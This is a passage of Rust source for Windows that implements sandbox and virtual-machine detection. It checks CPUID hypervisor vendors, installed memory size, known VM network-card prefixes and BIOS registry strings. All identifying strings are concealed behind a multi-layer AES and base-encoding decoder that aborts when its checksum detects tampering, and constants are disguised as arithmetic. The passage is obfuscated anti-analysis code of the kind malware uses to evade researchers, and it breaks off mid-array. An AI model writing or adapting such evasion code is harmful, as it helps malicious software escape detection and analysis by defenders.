

use raw_cpuid::CpuId;
use std::arch::x86_64::_rdtsc;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::NetworkManagement::IpHelper::GetAdaptersInfo;
use windows::Win32::NetworkManagement::IpHelper::IP_ADAPTER_INFO;
use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
use windows::Win32::System::Diagnostics::ToolHelp::CreateToolhelp32Snapshot;
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32W;
use windows::Win32::System::Diagnostics::ToolHelp::Process32FirstW;
use windows::Win32::System::Diagnostics::ToolHelp::Process32NextW;
use windows::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPPROCESS;
use windows::Win32::System::Registry::HKEY;
use windows::Win32::System::Registry::HKEY_LOCAL_MACHINE;
use windows::Win32::System::Registry::KEY_READ;
use windows::Win32::System::Registry::RegCloseKey;
use windows::Win32::System::Registry::RegEnumKeyExW;
use windows::Win32::System::Registry::RegOpenKeyExW;
use windows::Win32::System::Registry::RegQueryValueExW;
use windows::Win32::System::SystemInformation::GetPhysicallyInstalledSystemMemory;
use windows::Win32::System::SystemInformation::GetSystemInfo;
use windows::Win32::System::SystemInformation::SYSTEM_INFO;
use windows::core::PCWSTR;
use windows::core::PWSTR;

#[inline(never)]
fn checksum_qalbmz_d_biosm(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_bpcz_gftyzfrr(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_qalbmz_d_biosm(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

           pub fn check_cpuid_hypervisor () -> bool { let cpuid = CpuId :: new () ; if let Some (hypervisor_info) = cpuid . get_hypervisor_info () { match hypervisor_info . identify () { raw_cpuid :: Hypervisor :: VMware | raw_cpuid :: Hypervisor :: KVM | raw_cpuid :: Hypervisor :: HyperV | raw_cpuid :: Hypervisor :: Xen | raw_cpuid :: Hypervisor :: QEMU => true , raw_cpuid :: Hypervisor :: Unknown (ebx , ecx , edx) => { let mut vendor_id : [u8 ; (4 + 8)] = [0 ; (2 + 10)] ; vendor_id [0 .. 4] . copy_from_slice (& ebx . to_le_bytes ()) ; vendor_id [4 .. 8] . copy_from_slice (& ecx . to_le_bytes ()) ; vendor_id [8 .. (2 + 10)] . copy_from_slice (& edx . to_le_bytes ()) ; let vendor = std :: str :: from_utf8 (& vendor_id) . unwrap_or ("") ; matches ! (vendor , "VBoxVBoxVBox" | "prl hyperv") } _ => false , } } else { false } } pub fn check_memory_size () -> bool { let mut total_memory_in_kb : u64 = 0 ; if unsafe { GetPhysicallyInstalledSystemMemory (& mut total_memory_in_kb) } . is_ok () { let total_memory_in_gb = total_memory_in_kb / (326 + 698) / (217 + 807) ; let common_vm_sizes = [1 , 2 , 4] ; common_vm_sizes . contains (& total_memory_in_gb) } else { false } } pub fn check_mac_address () -> bool { let mut buffer_size : u32 = 0 ; unsafe { GetAdaptersInfo (None , & mut buffer_size) ; } if buffer_size == 0 { return false ; } let mut adapter_info_buffer : Vec < u8 > = vec ! [0 ; buffer_size as usize] ; let adapter_info_ptr = adapter_info_buffer . as_mut_ptr () as * mut IP_ADAPTER_INFO ; if unsafe { GetAdaptersInfo (Some (adapter_info_ptr) , & mut buffer_size) } == 0 { let vm_mac_prefixes = [decode_bpcz_gftyzfrr (& [219 , 29 , 77 , 51 , 233 , 178 , 121 , 74 , 222 , 37 , 138 , 145 , 4 , 105 , 14 , 140 , 37 , 101 , 187 , 89 , 32 , 165 , 176 , 165 , 104 , 102 , 79 , 119 , 138 , 15 , 159 , 69 , 236 , 254 , 134 , 203 , 87 , 88 , 49 , 34 , 11 , 83 , 119 , 220 , 183 , 129 , 153 , 62 , 111 , 96 , 60 , 52 , 83 , 19 , 91 , 106 , 208 , 175 , 90 , 230 , 1 , 197 , 76 , 200 , 157 , 151 , 155 , 205 , 250 , 37 , 9 , 92 , 157 , 184 , 237 , 2 , 232 , 111 , 100 , 200 , 1 , 0 , 165 , 108 , 233 , 174 , 67 , 219 , 143 , 235 , 1 , 121 , 150 , 84 , 212 , 229 , 204 , 252 , 184 , 151 , 185 , 76 , 93 , 243 , 37 , 220 , 173 , 222 , 167 , 246 , 238 , 233 , 59 , 164 , 82 , 57 , 129 , 95 , 36 , 109 , 90 , 113 , 101 , 79 , 128 , 255 , 213 , 237] , & [81 , 173 , 100 , 66 , 1 , 8 , 7 , 44 , 47 , 58 , 144 , 208 , 233 , 179 , 44 , 196 , 233 , 30 , 40 , 131 , 175 , 148 , 19 , 229 , 35 , 25 , 19 , 165 , 48 , 37 , 149 , 75 , 39 , 125 , 193 , 186 , 235 , 70 , 85 , 14 , 230 , 185 , 200 , 122 , 43 , 220 , 147 , 85 , 143 , 43 , 161 , 85 , 79 , 104 , 148 , 63 , 29 , 109 , 199 , 97 , 189 , 191 , 48 , 245 , 161 , 226 , 97 , 112 , 186 , 46 , 25 , 43 , 82 , 43 , 168 , 203 , 8 , 222 , 183 , 94 , 57 , 33 , 163 , 154 , 62 , 63 , 118 , 220] , 8018703942057u64) , decode_bpcz_gftyzfrr (& [166 , 94 , 223 , 169 , 121 , 178 , 172 , 66 , 182 , 21 , 129 , 162 , 200 , 196 , 12 , 197 , 175 , 128 , 134 , 210 , 202 , 83 , 227 , 187 , 55 , 190 , 107 , 208 , 54 , 106 , 4 , 174 , 40 , 62 , 54 , 110 , 235 , 57 , 175 , 155 , 191 , 11 , 3 , 134 , 112 , 169 , 123 , 62 , 87 , 187 , 193 , 175 , 254 , 104 , 109 , 84 , 179 , 34 , 116 , 93 , 133 , 229 , 106 , 174 , 12 , 132 , 34 , 25 , 31 , 214 , 206 , 7 , 69 , 0 , 165 , 127 , 142 , 51 , 208 , 243 , 74 , 208 , 59 , 64 , 84 , 213 , 12 , 138 , 21 , 22 , 201 , 76 , 51 , 243 , 247 , 167 , 84 , 175 , 243 , 105 , 143 , 6 , 157 , 7 , 203 , 182 , 138 , 148 , 237 , 38 , 149 , 203 , 59 , 85 , 104 , 57 , 110 , 204 , 134 , 142 , 101 , 64 , 6 , 154 , 198 , 240 , 30 , 198] , & [218 , 86 , 199 , 29 , 162 , 225 , 138 , 169 , 36 , 221 , 122 , 45 , 226 , 212 , 210 , 9 , 132 , 75 , 105 , 79 , 136 , 254 , 131 , 60 , 21 , 60 , 151 , 91 , 238 , 189 , 16 , 103 , 101 , 235 , 232 , 91 , 77 , 184 , 15 , 54 , 129 , 5 , 116 , 198 , 116 , 45 , 186 , 117 , 177 , 36 , 58 , 63 , 186 , 31 , 190 , 69 , 136 , 99 , 63 , 147 , 239 , 200 , 198 , 151 , 157 , 11 , 60 , 47 , 48 , 132 , 41 , 92 , 121 , 85 , 233 , 45 , 71 , 29 , 17 , 219 , 27 , 52 , 228 , 229 , 141 , 99 , 149 , 204] , 8224862372275u64) , decode_bpcz_gftyzfrr (& [127 , 80 , 12 , 59 , 240 , 161 , 92 , 78 , 20 , 60 , 78 , 177 , 247 , 129 , 119 , 94 , 25 , 207 , 255 , 15 , 17 , 164 , 149 , 53 , 28 , 52 , 125 , 141 , 202 , 48 , 33 , 24 , 79 , 62 , 175 , 106 , 17 , 191 , 166 , 226 , 11 , 72 , 117 , 211 , 165 , 19 , 184 , 176 , 141 , 36 , 51 , 244 , 205 , 79 , 80 , 189 , 101 , 238 , 15 , 181 , 65 , 51 , 160 , 212 , 166 , 146 , 182 , 203 , 251 , 89 , 177 , 239 , 186 , 174 , 13 , 190 , 136 , 241 , 192 , 55 , 187 , 180 , 148 , 0 , 232 , 68 , 15 , 93 , 40 , 182 , 120 , 231 , 107 , 189 , 8 , 227 , 31 , 105 , 22 , 166 , 158 , 97 , 91 , 185 , 75 , 103 , 77 , 223 , 181 , 64 , 87 , 132 , 151 , 38 , 145 , 182 , 22 , 206 , 200 , 239 , 165 , 140 , 32 , 145 , 249 , 40 , 185 , 135] , & [169 , 9 , 60 , 189 , 213 , 138 , 20 , 222 , 117 , 217 , 229 , 119 , 215 , 63 , 33 , 217 , 68 , 162 , 195 , 123 , 242 , 135 , 136 , 134 , 233 , 161 , 169 , 237 , 154 , 139 , 226 , 110 , 79 , 68 , 2 , 158 , 49 , 93 , 108 , 123 , 32 , 178 , 142 , 136 , 119 , 102 , 24 , 105 , 119 , 9 , 151 , 50 , 118 , 43 , 244 , 20 , 106 , 255 , 150 , 195 , 53 , 49 , 244 , 7 , 182 , 105 , 245 , 199 , 190 , 88 , 206 , 218 , 87 , 211 , 24 , 54 , 166 , 222 , 89 , 189 , 65 , 231 , 98 , 39 , 138 , 50 , 17 , 195] , 8216272437678u64) , decode_bpcz_gftyzfrr (& [130 , 75 , 221 , 235 , 44 , 185 , 85 , 155 , 52 , 57 , 220 , 151 , 114 , 79 , 209 , 170 , 160 , 215 , 83 , 229 , 8 , 90 , 48 , 103 , 60 , 120 , 111 , 42 , 198 , 92 , 126 , 88 , 66 , 164 , 158 , 57 , 19 , 81 , 166 , 46 , 176 , 1 , 227 , 84 , 153 , 87 , 19 , 117 , 144 , 251 , 170 , 211 , 235 , 173 , 199 , 211 , 10 , 71 , 201 , 168 , 253 , 56 , 114 , 96 , 237 , 85 , 206 , 110 , 66 , 148 , 183 , 241 , 5 , 189 , 216 , 199 , 153 , 237 , 166 , 92 , 6 , 46 , 192 , 118 , 197 , 17 , 134 , 150 , 27 , 20 , 191 , 133 , 30 , 73 , 58 , 128 , 62 , 116 , 61 , 239 , 86 , 192 , 103 , 44 , 199 , 166 , 144 , 16 , 84 , 12 , 3 , 187 , 189 , 159 , 111 , 25 , 13 , 212 , 87 , 152 , 28 , 10 , 141 , 41 , 59 , 91 , 160 , 228] , & [127 , 39 , 245 , 24 , 145 , 79 , 216 , 91 , 146 , 242 , 111 , 153 , 71 , 249 , 163 , 254 , 195 , 125 , 242 , 46 , 211 , 81 , 254 , 163 , 135 , 86 , 195 , 84 , 199 , 51 , 99 , 72 , 78 , 152 , 135 , 1 , 229 , 221 , 66 , 129 , 254 , 55 , 115 , 201 , 31 , 169 , 213 , 23 , 151 , 20 , 143 , 225 , 58 , 123 , 20 , 84 , 223 , 81 , 62 , 156 , 15 , 105 , 93 , 140 , 105 , 93 , 210 , 127 , 54 , 237 , 232 , 45 , 134 , 88 , 91 , 93 , 102 , 85 , 128 , 246 , 234 , 140 , 231 , 49 , 51 , 59 , 182 , 31] , 8018703942053u64) , decode_bpcz_gftyzfrr (& [204 , 66 , 237 , 109 , 178 , 38 , 119 , 153 , 141 , 14 , 0 , 20 , 180 , 46 , 79 , 182 , 99 , 227 , 35 , 244 , 148 , 20 , 60 , 168 , 20 , 25 , 233 , 2 , 159 , 78 , 179 , 15 , 95 , 50 , 230 , 233 , 65 , 133 , 117 , 3 , 66 , 86 , 66 , 76 , 177 , 150 , 18 , 66 , 25 , 105 , 170 , 180 , 169 , 84 , 141 , 56 , 93 , 58 , 18 , 8 , 106 , 16 , 179 , 25 , 10 , 111 , 47 , 198 , 240 , 128 , 48 , 227 , 128 , 96 , 190 , 129 , 139 , 233 , 249 , 192 , 190 , 127 , 57 , 14 , 68 , 99 , 202 , 140 , 185 , 160 , 219 , 174 , 176 , 222 , 191 , 46 , 212 , 176 , 18 , 203 , 133 , 28 , 88 , 96 , 8 , 111 , 254 , 101 , 147 , 138 , 103 , 170 , 171 , 27 , 97 , 31 , 173 , 91 , 243 , 208 , 81 , 214 , 48 , 98 , 255 , 171 , 106 , 173] , & [244 , 4 , 108 , 79 , 198 , 243 , 24 , 21 , 203 , 206 , 247 , 101 , 126 , 52 , 177 , 128 , 116 , 175 , 10 , 220 , 177 , 236 , 63 , 118 , 137 , 114 , 104 , 253 , 39 , 79 , 88 , 199 , 124 , 108 , 36 , 150 , 213 , 92 , 152 , 38 , 59 , 243 , 110 , 56 , 158 , 137 , 193 , 37 , 106 , 218 , 231 , 139 , 81 , 248 , 71 , 98 , 198 , 210 , 153 , 153 , 237 , 70 , 21 , 112 , 94 , 28 , 40 , 119 , 104 , 198 , 147 , 166 , 107 , 132 , 168 , 242 , 211 , 233 , 223 , 197 , 222 , 139 , 230 , 155 , 192 , 124 , 144 , 242] , 8130373091750u64) , decode_bpcz_gftyzfrr (& [144 , 151 , 118 , 151 , 243 , 31 , 62 , 8 , 67 , 209 , 71 , 61 , 20 , 50 , 239 , 172 , 221 , 158 , 15 , 186 , 44 , 113 , 52 , 165 , 208 , 102 , 123 , 252 , 250 , 73 , 63 , 204 , 66 , 179 , 142 , 143 , 118 , 10 , 38 , 52 , 89 , 184 , 164 , 27 , 202 , 99 , 181 , 157 , 168 , 90 , 76 , 144 , 141 , 177 , 31 , 114 , 205 , 217 , 196 , 91 , 136 , 244 , 38 , 97 , 167 , 255 , 165 , 114 , 70 , 59 , 102 , 81 , 110 , 246 , 42 , 98 , 129 , 174 , 201 , 56 , 70 , 16 , 90 , 23 , 30 , 211 , 91 , 159 , 147 , 134 , 157 , 125 , 147 , 146 , 19 , 15 , 70 , 66 , 44 , 245 , 154 , 95 , 33 , 254 , 100 , 108 , 42 , 231 , 198 , 131 , 12 , 188 , 86 , 41 , 239 , 21 , 82 , 230 , 167 , 95 , 107 , 170 , 161 , 114 , 133 , 163 , 148 , 68] , & [173 , 205 , 210 , 10 , 189 , 210 , 184 , 235 , 50 , 254 , 163 , 39 , 75 , 53 , 112 , 192 , 95 , 192 , 189 , 57 , 10 , 5 , 255 , 133 , 254 , 21 , 255 , 72 , 23 , 60 , 23 , 226 , 189 , 180 , 6 , 17 , 33 , 31 , 64 , 65 , 184 , 250 , 186 , 18 , 83 , 55 , 157 , 143 , 129 , 29 , 66 , 133 , 168 , 219 , 112 , 234 , 195 , 163 , 31 , 5 , 131 , 61 , 134 , 77 , 221 , 118 , 207 , 31 , 255 , 25 , 80 , 57 , 251 , 93 , 64 , 102 , 75 , 200 , 155 , 130 , 68 , 129 , 58 , 187 , 236 , 25 , 7 , 232] , 8233452306863u64) , decode_bpcz_gftyzfrr (& [25 , 56 , 41 , 24 , 129 , 75 , 79 , 159 , 50 , 48 , 172 , 23 , 45 , 231 , 104 , 251 , 36 , 66 , 21 , 198 , 129 , 11 , 48 , 201 , 254 , 95 , 56 , 81 , 179 , 17 , 222 , 20 , 19 , 179 , 224 , 92 , 200 , 28 , 79 , 38 , 137 , 208 , 175 , 159 , 71 , 13 , 204 , 99 , 152 , 41 , 196 , 215 , 30 , 221 , 212 , 155 , 85 , 159 , 46 , 212 , 54 , 88 , 54 , 90 , 183 , 146 , 4 , 166 , 179 , 21 , 98 , 7 , 123 , 1 , 251 , 233 , 107 , 11 , 69 , 159 , 74 , 0 , 146 , 245 , 30 , 201 , 125 , 93 , 95 , 193 , 212 , 74 , 250 , 253 , 138 , 18 , 209 , 1 , 158 , 7 , 170 , 52 , 223 , 194 , 146 , 3 , 70 , 66 , 160 , 54 , 90 , 67 , 84 , 178 , 188 , 176 , 236 , 48 , 168 , 17 , 68 , 76 , 166 , 121 , 233 , 195 , 140 , 114] , & [245 , 10 , 36 , 255 , 216 , 219 , 41 , 81 , 106 , 219 , 72 , 95 , 51 , 101 , 23 , 122 , 180 , 16 , 2 , 227 , 167 , 16 , 103 , 95 , 66 , 158 , 156 , 150 , 140 , 64 , 156 , 101 , 64 , 191 , 47 , 110 , 200 , 226 , 244 , 97 , 104 , 189 , 24 , 121 , 191 , 98 , 174 , 39 , 102 , 79 , 95 , 83 , 175 , 201 , 32 , 186 , 32 , 27 , 67 , 220 , 144 , 198 , 96 , 67 , 154 , 211 , 54 , 248 , 211 , 128 , 242 , 29 , 183 , 152 , 160 , 182 , 137 , 176 , 209 , 127 , 186 , 69 , 219 , 51 , 105 , 36 , 224 , 119] , 8250632176037u64) ,] ; let mut current_adapter = adapter_info_ptr ; while ! current_adapter . is_null () { let mac_address_len = unsafe { (* current_adapter) . AddressLength } as usize ; if mac_address_len == 6 { let mac_address_slice = unsafe { & (& (* current_adapter) . Address) [0 .. mac_address_len] } ; let mac_address_str = mac_address_slice . iter () . map (| & byte | format ! ("{:02X}" , byte)) . collect :: < Vec < String > > () . join (":") ; for prefix in & vm_mac_prefixes { if mac_address_str . starts_with (& * * prefix) { return true ; } } } current_adapter = unsafe { (* current_adapter) . Next } ; } } false } pub fn check_bios () -> bool { let mut key_handle : HKEY = HKEY (0) ; let subkey_pcwstr = fqgjhfwh (& decode_bpcz_gftyzfrr (& [58 , 228 , 18 , 161 , 215 , 65 , 166 , 173 , 119 , 49 , 92 , 86 , 244 , 61 , 135 , 124 , 140 , 130 , 233 , 108 , 46 , 25 , 77 , 117 , 192 , 11 , 162 , 244 , 220 , 176 , 241 , 56 , 119 , 197 , 253 , 20 , 225 , 253 , 197 , 252 , 52 , 186 , 26 , 199 , 206 , 186 , 195 , 190 , 90 , 124 , 218 , 208 , 211 , 77 , 95 , 254 , 20 , 108 , 208 , 48 , 145 , 240 , 131 , 236 , 222 , 150 , 11 , 145 , 193 , 245 , 2 , 223 , 52 , 34 , 251 , 76 , 219 , 108 , 180 , 129 , 39 , 161 , 80 , 2 , 159 , 170 , 88 , 88 , 10 , 9 , 230 , 105 , 62 , 171 , 209 , 13 , 130 , 170 , 215 , 204 , 99 , 76 , 186 , 12 , 19 , 215 , 170 , 248 , 65 , 253 , 70 , 186 , 147 , 43 , 146 , 64 , 86 , 142 , 33 , 79 , 68 , 35 , 121 , 0 , 247 , 136 , 86 , 212 , 209 , 154 , 135 , 177 , 221 , 158 , 75 , 207 , 253 , 116 , 152 , 23 , 236 , 203 , 139 , 4 , 120 , 73 , 53 , 161 , 168 , 33 , 170 , 250 , 164 , 51 , 152 , 231 , 189 , 98 , 52 , 60 , 135 , 179 , 194 , 82 , 222 , 23 , 219 , 144 , 196 , 43 , 128 , 238 , 93 , 186 , 73 , 104 , 167 , 36 , 63 , 112 , 25 , 115 , 199 , 141 , 125 , 0 , 190 , 170 , 60 , 38 , 67 , 11 , 108 , 26 , 0 , 255 , 97 , 186 , 53 , 18 , 61 , 164 , 33 , 125 , 22 , 118 , 130 , 163 , 21 , 225 , 0 , 137 , 219 , 192 , 193 , 208 , 252 , 124 , 116 , 34 , 231 , 101 , 194 , 170 , 196 , 156 , 33 , 70 , 228 , 84 , 247 , 211 , 130 , 128 , 219 , 23 , 45 , 27 , 27 , 50 , 46 , 181 , 216 , 91 , 227 , 118 , 134 , 8 , 37 , 19 , 233 , 228 , 33 , 57 , 103 , 220 , 71 , 174 , 96 , 108 , 75 , 61 , 59 , 6 , 194 , 147 , 192 , 84 , 120 , 90 , 246 , 35 , 136 , 48 , 98 , 198 , 63 , 118 , 87 , 89 , 84 , 63 , 217 , 162 , 2 , 219 , 87 , 24 , 222 , 239 , 25 , 147 , 201 , 74 , 204 , 121 , 68 , 49 , 117 , 53 , 3 , 80 , 132 , 136 , 98 , 109 , 0 , 157 , 39 , 47 , 163 , 167 , 225 , 194 , 173 , 132 , 141 , 210 , 173 , 76 , 2 , 156 , 222 , 157 , 199 , 190 , 19 , 239 , 71 , 208 , 43 , 75 , 226 , 235 , 32 , 177] , & [141 , 168 , 165 , 48 , 2 , 210 , 14 , 100 , 98 , 95 , 11 , 166 , 228 , 135 , 96 , 170 , 74 , 215 , 101 , 37 , 200 , 144 , 234 , 146 , 106 , 148 , 226 , 88 , 238 , 34 , 227 , 91 , 29 , 163 , 71 , 231 , 47 , 128 , 16 , 55 , 178 , 52 , 194 , 125 , 109 , 24 , 164 , 245 , 30 , 48 , 100 , 67 , 217 , 102 , 175 , 135 , 213 , 225 , 102 , 185 , 32 , 219 , 166 , 51 , 175 , 41 , 73 , 216 , 43 , 10 , 132 , 19 , 225 , 49 , 251 , 54 , 84 , 165 , 47 , 57 , 109 , 199 , 75 , 185 , 19 , 9 , 177 , 238] , 125696512886992u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (subkey_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut key_handle ,) } . is_err () { return false ; } let vm_bios_strings = [decode_bpcz_gftyzfrr (& [20 , 243 , 157 , 224 , 179 , 159 , 250 , 209 , 155 , 129 , 135 , 138 , 53 , 9 , 15 , 95 , 248 , 2 , 21 , 211 , 34 , 135 , 174 , 14 , 66 , 136 , 83 , 150 , 1 , 35 , 73 , 68 , 77 , 250 , 131 , 196 , 159 , 15 , 101 , 35 , 58 , 56 , 32 , 229 , 36 , 190 , 110 , 254 , 134 , 162 , 240 , 194 , 5 , 247 , 251 , 227 , 16 , 65 , 203 , 147 , 161 , 213 , 195 , 62 , 87 , 168 , 100 , 66 , 215 , 239 , 194 , 249 , 58 , 38 , 86 , 36 , 248 , 67 , 154 , 193 , 167 , 205 , 32 , 158 , 35 , 194 , 185 , 213 , 92 , 189 , 12 , 177 , 98 , 0 , 50 , 216] , & [143 , 60 , 103 , 239 , 244 , 119 , 85 , 61 , 148 , 62 , 156 , 201 , 161 , 69 , 6 , 153 , 223 , 138 , 176 , 23 , 141 , 145 , 64 , 36 , 228 , 249 , 8 , 200 , 200 , 199 , 112 , 141 , 59 , 38 , 171 , 72 , 108 , 226 , 112 , 1 , 201 , 105 , 95 , 196 , 10 , 44 , 59 , 138 , 57 , 68 , 195 , 78 , 14 , 1 , 194 , 61 , 165 , 232 , 9 , 213 , 242 , 66 , 50 , 11 , 89 , 170 , 56 , 212 , 162 , 199 , 210 , 100 , 252 , 142 , 166 , 249 , 255 , 47 , 62 , 53 , 137 , 249 , 143 , 246 , 193 , 231 , 49 , 151] , 8602819494483u64) , decode_bpcz_gftyzfrr (& [139 , 7 , 48 , 168 , 243 , 208 , 225 , 26 , 201 , 191 , 86 , 225 , 161 , 83 , 137 , 4 , 116 , 197 , 205 , 146 , 226 , 240 , 61 , 63 , 230 , 242 , 36 , 64 , 76 , 88 , 14 , 68 , 221 , 130 , 14 , 207 , 75 , 30 , 106 , 74 , 99 , 222 , 190 , 88 , 171 , 207 , 39 , 184 , 89 , 148 , 0 , 223 , 111 , 185 , 120 , 151 , 145 , 238 , 220 , 55 , 7 , 195 , 139 , 84 , 136 , 4 , 88 , 224 , 83 , 97 , 237 , 225 , 19 , 186 , 239 , 142 , 183 , 231 , 216 , 124 , 51 , 34 , 94 , 195 , 188 , 8 , 117 , 153 , 143 , 144 , 80 , 3 , 251 , 54 , 17 , 94 , 148 , 215 , 58 , 151 , 84 , 77 , 120 , 158 , 192 , 8 , 208 , 71 , 237 , 64 , 92 , 184 , 205 , 190 , 185 , 150 , 40 , 217 , 234 , 45 , 69 , 135 , 176 , 93 , 61 , 145 , 123 , 193 , 210 , 101 , 22 , 169 , 252 , 131 , 180 , 193 , 132 , 54 , 154 , 60 , 85 , 151 , 0 , 136] , & [6 , 180 , 108 , 156 , 43 , 111 , 160 , 154 , 246 , 51 , 52 , 213 , 188 , 2 , 6 , 82 , 148 , 211 , 92 , 73 , 168 , 220 , 237 , 186 , 69 , 195 , 100 , 119 , 184 , 233 , 9 , 246 , 22 , 95 , 243 , 67 , 16 , 200 , 185 , 148 , 56 , 157 , 138 , 158 , 63 , 138 , 129 , 80 , 181 , 40 , 108 , 69 , 194 , 4 , 122 , 59 , 173 , 11 , 255 , 93 , 248 , 103 , 16 , 64 , 223 , 37 , 53 , 52 , 190 , 60 , 56 , 247 , 107 , 251 , 145 , 109 , 31 , 48 , 110 , 246 , 102 , 73 , 13 , 152 , 189 , 211 , 161 , 30] , 24472723653649u64) , decode_bpcz_gftyzfrr (& [38 , 220 , 99 , 36 , 7 , 45 , 4 , 44 , 54 , 36 , 227 , 80 , 248 , 211 , 136 , 159 , 1 , 70 , 183 , 103 , 185 , 164 , 153 , 133 , 39 , 174 , 70 , 77 , 23 , 140 , 59 , 160 , 110 , 235 , 84 , 220 , 135 , 175 , 128 , 132 , 245 , 120 , 227 , 76 , 209 , 88 , 255 , 38 , 107 , 37 , 218 , 232 , 79 , 139 , 236 , 39 , 71 , 194 , 79 , 1 , 224 , 165 , 230 , 116 , 185 , 157 , 216 , 157 , 158 , 222 , 117 , 163 , 20 , 113 , 178 , 164 , 241 , 251 , 185 , 188] , & [171 , 213 , 51 , 111 , 156 , 214 , 204 , 127 , 212 , 149 , 87 , 98 , 224 , 116 , 54 , 150 , 91 , 22 , 41 , 138 , 179 , 167 , 234 , 199 , 240 , 72 , 37 , 134 , 89 , 80 , 154 , 224 , 150 , 102 , 196 , 73 , 81 , 62 , 122 , 171 , 8 , 173 , 246 , 62 , 252 , 217 , 159 , 42 , 107 , 254 , 105 , 22 , 253 , 13 , 43 , 211 , 141 , 53 , 139 , 172 , 151 , 62 , 210 , 48 , 15 , 22 , 33 , 5 , 118 , 51 , 81 , 231 , 110 , 120 , 249 , 88 , 241 , 203 , 245 , 210 , 108 , 199 , 25 , 215 , 233 , 67 , 96 , 234] , 3324304687417u64) , decode_bpcz_gftyzfrr (& [123 , 138 , 236 , 59 , 31 , 97 , 177 , 205 , 217 , 58 , 24 , 242 , 186 , 66 , 109 , 36 , 22 , 100 , 4 , 177 , 180 , 143 , 50 , 220 , 38 , 206 , 8 , 211 , 126 , 13 , 61 , 72 , 211 , 108 , 199 , 233 , 149 , 251 , 17 , 254 , 193 , 75 , 47 , 92 , 84 , 71 , 217 , 255 , 92 , 218 , 151 , 104 , 136 , 99 , 157 , 71 , 229 , 200 , 10 , 132 , 37 , 105 , 102 , 93 , 37 , 60 , 174 , 180 , 233 , 1 , 248 , 175 , 16 , 195 , 64 , 156 , 233 , 38 , 79 , 37 , 123 , 101 , 206 , 4 , 230 , 40 , 19 , 247 , 202 , 206 , 170 , 233 , 179 , 45 , 60 , 234] , & [78 , 170 , 64 , 56 , 229 , 246 , 117 , 223 , 249 , 215 , 31 , 179 , 146 , 189 , 246 , 206 , 108 , 137 , 136 , 9 , 148 , 129 , 129 , 14 , 50 , 78 , 250 , 115 , 185 , 130 , 136 , 99 , 66 , 85 , 152 , 55 , 159 , 62 , 150 , 8 , 40 , 150 , 61 , 145 , 19 , 109 , 71 , 23 , 90 , 7 , 88 , 233 , 175 , 104 , 145 , 123 , 195 , 140 , 217 , 46 , 231 , 128 , 125 , 115 , 20 , 11 , 203 , 124 , 91 , 15 , 59 , 82 , 159 , 157 , 227 , 142 , 254 , 92 , 79 , 6 , 225 , 130 , 148 , 69 , 15 , 8 , 217 , 203] , 11678016078476u64) , decode_bpcz_gftyzfrr (& [2 , 85 , 146 , 142 , 55 , 208 